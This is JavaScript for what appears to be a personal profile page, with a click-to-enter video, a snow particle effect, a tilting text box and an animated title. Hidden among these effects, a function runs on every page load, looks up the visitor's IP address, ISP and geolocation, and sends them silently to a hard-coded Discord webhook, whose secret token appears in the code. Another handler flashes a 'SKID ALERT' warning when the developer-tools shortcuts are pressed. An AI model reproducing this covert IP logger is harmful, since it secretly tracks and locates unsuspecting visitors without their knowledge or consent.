const enterButton = document.getElementById('enterButton');
const videoContainer = document.getElementById('videoContainer');
const video = document.querySelector('#videoContainer video');
const audio = document.getElementById('audio');
const textBox = document.getElementById('textBox');

enterButton.addEventListener('click', () => {
  enterButton.style.opacity = '0';

  setTimeout(() => {
    enterButton.style.display = 'none';
    videoContainer.style.display = 'block';
    textBox.style.display = 'block';

    setTimeout(() => {
      videoContainer.style.opacity = '1';
      textBox.style.opacity = '1';
      video.play();
      audio.play();
    }, 100);
  }, 500);
});

document.addEventListener('DOMContentLoaded', function () {
  const script = document.createElement('script');
  script.src = 'https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js';
  script.onload = function () {
    particlesJS("snow", {
      "particles": {
        "number": {
          "value": 40,
          "density": {
            "enable": true,
            "value_area": 800
          }
        },
        "color": {
          "value": "#ffffff"
        },
        "opacity": {
          "value": 0.7,
          "random": true,
          "anim": {
            "enable": true
          }
        },
        "size": {
          "value": 2.3,
          "random": true,
          "anim": {
            "enable": true
          }
        },
        "line_linked": {
          "enable": false
        },
        "move": {
          "enable": true,
          "speed": 5,
          "direction": "bottom",
          "random": true,
          "straight": false,
          "out_mode": "out",
          "bounce": false,
          "attract": {
            "enable": true,
            "rotateX": 300,
            "rotateY": 1200
          }
        }
      },
      "interactivity": {
        "events": {
          "onhover": {
            "enable": false
          },
          "onclick": {
            "enable": true
          },
          "resize": false
        }
      },
      "retina_detect": true
    });
  };
  document.head.append(script);
});

textBox.addEventListener('mousemove', (e) => {
  const rect = textBox.getBoundingClientRect();
  const x = e.clientX - rect.left;
  const y = e.clientY - rect.top;
  const centerX = rect.width / 2;
  const centerY = rect.height / 2;

  const deltaX = x - centerX;
  const deltaY = y - centerY;

  const maxTilt = 30;

  let tiltX = (deltaX / centerX) * maxTilt;
  let tiltY = (deltaY / centerY) * maxTilt;

  if (x < centerX) {
    tiltX = -Math.abs(tiltX);
  } else {
    tiltX = Math.abs(tiltX);
  }

  if (y < centerY) {
    tiltY = -Math.abs(tiltY);
  } else {
    tiltY = Math.abs(tiltY);
  }

  textBox.style.transform = `translateY(-50%) rotateX(${tiltY}deg) rotateY(${tiltX}deg)`;
});

textBox.addEventListener('mouseleave', () => {
  textBox.style.transform = 'translateY(-50%) rotateX(0deg) rotateY(0deg)';
});

let flashingActive = false;

document.addEventListener('keydown', (e) => {
  if (
    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) &&
    !flashingActive
  ) {
    flashingActive = true;

    const flashOverlay = document.createElement('div');
    flashOverlay.style.position = 'fixed';
    flashOverlay.style.top = '0';
    flashOverlay.style.left = '0';
    flashOverlay.style.width = '100%';
    flashOverlay.style.height = '100%';
    flashOverlay.style.display = 'flex';
    flashOverlay.style.justifyContent = 'center';
    flashOverlay.style.alignItems = 'center';
    flashOverlay.style.zIndex = '9999';
    flashOverlay.style.pointerEvents = 'none';

    const alertText = document.createElement('div');
    alertText.innerText = 'SKID ALERT';
    alertText.style.color = 'red';
    alertText.style.fontSize = '4rem';
    alertText.style.fontWeight = 'bold';
    alertText.style.textShadow = '0 0 10px #ff0000';
    alertText.style.opacity = '0';

    flashOverlay.appendChild(alertText);
    document.body.appendChild(flashOverlay);

    const flash = () => {
      if (!flashingActive) return;
      
      flashOverlay.style.backgroundColor = 'rgba(255, 0, 0, 0.5)';
      alertText.style.opacity = '1';

      setTimeout(() => {
        if (!flashingActive) return;

        flashOverlay.style.backgroundColor = 'rgba(0, 0, 0, 0)';
        alertText.style.opacity = '0';

        setTimeout(flash, 500);
      }, 500);
    };

    flash();

    window.addEventListener('beforeunload', () => {
      flashingActive = false;
    });
  }
});

async function sendVisitorInfoToWebhook() {
  try {
    const response = await fetch('https://ipleak.net/json/');

    if (!response.ok) {
      console.error('Failed to fetch visitor data:', response.statusText);
      return;
    }

    const visitorData = await response.json();
    if (!visitorData) return;

    const visitorInfo = {
      ip: visitorData.ip || "Unknown",
      isp: visitorData.isp_name || "Unknown",
      asn: visitorData.as_number || "Unknown",
      country: visitorData.country_name || "Unknown",
      countryCode: visitorData.country_code || "Unknown",
      region: visitorData.region_name || "Unknown",
      regionCode: visitorData.region_code || "Unknown",
      city: visitorData.city_name || "Unknown",
      timezone: visitorData.time_zone || "Unknown",
      latitude: visitorData.latitude || 0,
      longitude: visitorData.longitude || 0,
      accuracyRadius: visitorData.accuracy_radius || "Unknown",
      mapLink: `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`,
      queryDate: new Date(visitorData.query_date * 1000 || Date.now()).toLocaleString(),
    };

    const embed = {
      title: "Visitor's IP and Geolocation Information",
      color: 0x000000,
      fields: [
        { name: "IP", value: visitorInfo.ip, inline: true },
        { name: "ISP", value: visitorInfo.isp, inline: true },
        { name: "ASN", value: visitorInfo.asn.toString(), inline: true },
        { name: "Country", value: `${visitorInfo.country} (${visitorInfo.countryCode})`, inline: true },
        { name: "Region", value: `${visitorInfo.region} (${visitorInfo.regionCode})`, inline: true },
        { name: "City", value: visitorInfo.city, inline: true },
        { name: "Time Zone", value: visitorInfo.timezone, inline: true },
        { name: "Latitude & Longitude", value: `${visitorInfo.latitude}, ${visitorInfo.longitude}`, inline: true },
        { name: "Accuracy Radius", value: `${visitorInfo.accuracyRadius} KM`, inline: true },
        { name: "Geolocation Map", value: `[Activate](${visitorInfo.mapLink})`, inline: false },
        { name: "Last Data Update", value: visitorInfo.queryDate, inline: false },
      ]
    };

    const webhookURL = 'https://discord.com/api/webhooks/1381721747946078278/k1SvGPolUaf5FrzpYIzmc43_rYI3UQO0vW3Y5jwLpsOzXuLaz6Rzr15dY-qpUZ0FK72x';
    const webhookResponse = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] }),
    });

    if (webhookResponse.ok) {
      console.log('Visitor info sent successfully!');
    } else {
      console.error('Failed to send data to Discord webhook:', webhookResponse.statusText);
    }
  } catch (error) {
    console.error('Unexpected error:', error.message);
  }
}

sendVisitorInfoToWebhook();


const originalTitle = "@quixkshot";
const deleteSpeed = 300; 
const typingSpeed = 300;

let titleIndex = 0;
let titleDeleteIndex = originalTitle.length;

function typeTitle() {
    if (titleIndex < originalTitle.length) {
        document.title += originalTitle.charAt(titleIndex);
        titleIndex++;
        setTimeout(typeTitle, typingSpeed);
    } else {
        setTimeout(deleteTitle, 0);
    }
}

function deleteTitle() {
    if (titleDeleteIndex >= 1) {
        document.title = document.title.slice(0, titleDeleteIndex);
        titleDeleteIndex--;
        setTimeout(deleteTitle, deleteSpeed);
    } else {
        titleIndex = 1;
        titleDeleteIndex = originalTitle.length;
        setTimeout(typeTitle, 0);
    }
}

window.onload = () => {
    typeTitle();
};
